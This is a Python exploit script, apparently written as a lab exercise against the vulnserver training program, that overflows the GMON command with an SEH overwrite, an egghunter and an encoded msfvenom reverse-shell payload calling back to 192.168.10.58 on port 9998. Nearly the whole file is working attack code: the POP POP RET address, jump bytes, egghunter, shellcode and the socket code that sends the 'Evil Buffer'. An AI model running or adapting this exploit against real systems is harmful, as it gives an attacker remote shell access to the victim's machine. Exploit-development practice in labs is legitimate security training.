#!/usr/bin/python
# COMPLETE - SEH OVERWRITE - badchars \x00 #
import socket

# POP POP RET - 0x625010B4 is essfunc.dll
offset = "\xB4\x10\x50\x62"

#jump back 64 bytes
jmpback = "\x90\x90\xeb\xc0"

# search for W00TW00T \x54\x30\x30\x57
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#66 bytes
jmplength = len(jmpback) + len(egghunter) + 30

print jmplength
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.58 LPORT=9998 -v shell -f python -e x86/shikata_ga_nai -b "\x00"
#Payload size: 351 bytes
shell =  ""
shell += "\xbe\x2e\x82\xdd\x1b\xdb\xd2\xd9\x74\x24\xf4\x5a\x2b"
shell += "\xc9\xb1\x52\x83\xc2\x04\x31\x72\x0e\x03\x5c\x8c\x3f"
shell += "\xee\x5c\x78\x3d\x11\x9c\x79\x22\x9b\x79\x48\x62\xff"
shell += "\x0a\xfb\x52\x8b\x5e\xf0\x19\xd9\x4a\x83\x6c\xf6\x7d"
shell += "\x24\xda\x20\xb0\xb5\x77\x10\xd3\x35\x8a\x45\x33\x07"
shell += "\x45\x98\x32\x40\xb8\x51\x66\x19\xb6\xc4\x96\x2e\x82"
shell += "\xd4\x1d\x7c\x02\x5d\xc2\x35\x25\x4c\x55\x4d\x7c\x4e"
shell += "\x54\x82\xf4\xc7\x4e\xc7\x31\x91\xe5\x33\xcd\x20\x2f"
shell += "\x0a\x2e\x8e\x0e\xa2\xdd\xce\x57\x05\x3e\xa5\xa1\x75"
shell += "\xc3\xbe\x76\x07\x1f\x4a\x6c\xaf\xd4\xec\x48\x51\x38"
shell += "\x6a\x1b\x5d\xf5\xf8\x43\x42\x08\x2c\xf8\x7e\x81\xd3"
shell += "\x2e\xf7\xd1\xf7\xea\x53\x81\x96\xab\x39\x64\xa6\xab"
shell += "\xe1\xd9\x02\xa0\x0c\x0d\x3f\xeb\x58\xe2\x72\x13\x99"
shell += "\x6c\x04\x60\xab\x33\xbe\xee\x87\xbc\x18\xe9\xe8\x96"
shell += "\xdd\x65\x17\x19\x1e\xac\xdc\x4d\x4e\xc6\xf5\xed\x05"
shell += "\x16\xf9\x3b\x89\x46\x55\x94\x6a\x36\x15\x44\x03\x5c"
shell += "\x9a\xbb\x33\x5f\x70\xd4\xde\x9a\x13\x1b\xb6\xae\xd9"
shell += "\xf3\xc5\xae\x3a\x0a\x43\x48\x2e\x02\x05\xc3\xc7\xbb"
shell += "\x0c\x9f\x76\x43\x9b\xda\xb9\xcf\x28\x1b\x77\x38\x44"
shell += "\x0f\xe0\xc8\x13\x6d\xa7\xd7\x89\x19\x2b\x45\x56\xd9"
shell += "\x22\x76\xc1\x8e\x63\x48\x18\x5a\x9e\xf3\xb2\x78\x63"
shell += "\x65\xfc\x38\xb8\x56\x03\xc1\x4d\xe2\x27\xd1\x8b\xeb"
shell += "\x63\x85\x43\xba\x3d\x73\x22\x14\x8c\x2d\xfc\xcb\x46"
shell += "\xb9\x79\x20\x59\xbf\x85\x6d\x2f\x5f\x37\xd8\x76\x60"
shell += "\xf8\x8c\x7e\x19\xe4\x2c\x80\xf0\xac\x5d\xcb\x58\x84"
shell += "\xf5\x92\x09\x94\x9b\x24\xe4\xdb\xa5\xa6\x0c\xa4\x51"
shell += "\xb6\x65\xa1\x1e\x70\x96\xdb\x0f\x15\x98\x48\x2f\x3c"

payload = "\x41" * 200
payload+= "T00WT00W"
payload+= "\x90" * 10
payload+= shell
payload+= "\x90" * 10
payload+= "\x41" * (2915 - jmplength)
payload+= "\x90" * 20
payload+= egghunter
payload+= "\x90" * 10
payload+= jmpback
payload+= offset 
payload+= "\x43" * 1594

buffer = "GMON /.:/ "
buffer+=payload

print "Sending Evil Buffer!"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.10.176', 9999))
s.recv(1024)
s.send(buffer)
s.close()
